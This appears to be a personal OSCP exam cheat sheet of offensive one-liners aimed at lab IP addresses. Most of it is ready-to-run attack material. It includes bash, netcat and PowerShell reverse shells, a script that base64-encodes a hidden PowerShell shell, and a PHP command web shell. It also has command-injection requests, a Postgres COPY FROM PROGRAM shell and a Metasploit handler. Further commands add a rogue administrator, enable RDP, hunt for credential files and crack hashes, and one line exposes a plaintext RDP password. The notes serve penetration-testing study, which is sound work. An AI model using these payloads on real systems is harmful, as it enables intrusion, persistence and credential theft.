- SSH connection to OSCP machines
```
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
```
- Bash One-Liners
```
	for ip in $(cat list.txt); do host $ip.megacorpone.com; done
```
- SecLists Project - collection of wordlists
- PHP command execution
```
<?php echo system($_GET['cmd']); ?>
```
- One liner reverse shell
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1

bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"

bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.217%2F4444%200%3E%261%22


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f

```

- powershell one liner reverse shell

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.230',4444);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0}while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex '. { $data } 2>&' | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
![[rev.ps1]]

Base64 encoding for powershell
```
$MyBase6 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('$client = New-Object System.Net.Sockets.TCPClient("192.168.45.",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' ))

$Bytes=[Convert]::FromBase64String($Text)
[System.Text.Encoding]::Unicode.GetString($Bytes)
```

msfconsole 

```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"

```
find using powershell

Get-ChildItem -Path C:\ -Include \*.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C: -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

download powershell

```
iwr -uri http://192.168.118.2/winPEASx64.exe -Outfile winPEAS.exe
iwr -uri http://192.168.45.204:9090/Seatbelt.exe -Outfile seat.exe
```

network scanning
for i in $(seq 1 254); do nc -zv -w 1 172.16.203.$i 445; done

xfreerdp /u:justin /p:_SuperS3cure1337#_ /v:192.168.203.202

curl -X POST http://192.168.174.134:13337/update -H "Content-Type: application/json" -H "X-Forwarded-For: localhost" --data '{"user":"clumsyadmin","url":"http://192.168.45.230:8000/mint"}'

```
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.2",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

```

php reverse shell

https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php


```
import os
os.popen("id").read()
```

### Upgrade shell

python -c 'import pty; pty.spawn("/bin/sh")'
`   python3 -c 'import pty; pty.spawn("/bin/bash")'   ` #upgrade-shell


curl -X  post --data "code=os.system('nc -e /bin/bash 192.168.45.162 18000')" http://192.168.175.117:50000/verify

```
%0Anc%20192.168.118.3%204444%20-e%20%2Fbin%2Fb

ssh -R 80:0.0.0.0:80 web_svc@192.168.240.147
ssh -N -R 127.0.0.1:60002:127.0.0.1:60002 kali@192.168.xx.xxx

ssh kali@192.168.45.238 -R 1234(kali_port):localhost:5432(victim_port)

```

bash -i>&/dev/tcp/192.168.45.225/8083 0>&1

nmap -sV -p- -oN nmap-all-ports 192.168.250.62

nc -e /bin/bash 192.168.45.162 18000  #nc_shell

https://medium.com/@cybenfolland/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa

john --wordlist=/usr/share/wordlists/rockyou.txt hash_teacher #mysql_hash_crack

https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php

file upload bypass extension

https://systemweakness.com/proving-grounds-practise-active-directory-box-access-79b1fe662f4d

https://shawnvoong.medium.com/how-to-pass-the-2023-oscp-pen-200-on-the-first-try-part-1-enumeration-a0b272a86cf7

Information Gathering

nmap -p- -sV -sC -v <IPADDRESS> — open

sudo nmap -p 53,67,68,69,111,123,161,162,137,138,139,514,1900,5353,500,445 -sU <IPADDRESS>

autorecon --nmap-append="min-rate=2000" --exclude-tags="top-100-udp-ports" --exclude-tags nikto --dirbuster.threads=40 --dirbuster.tool=gobuster -v 192.168.241.145 

wpscan — url [http://URL](http://URL)  
wpscan — url [http://URL](http://URL) — enumerate p — plugins-detection aggressive

user creation and rdp enable
net user /add jack Password@12345
net localgroup administrators jack /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

asp reverse shell

https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx

postgres reverse shell

COPY temp FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 8090 >/tmp/f';

sudo psql --host=127.0.0.1 -U postgres

\! /bin/sh
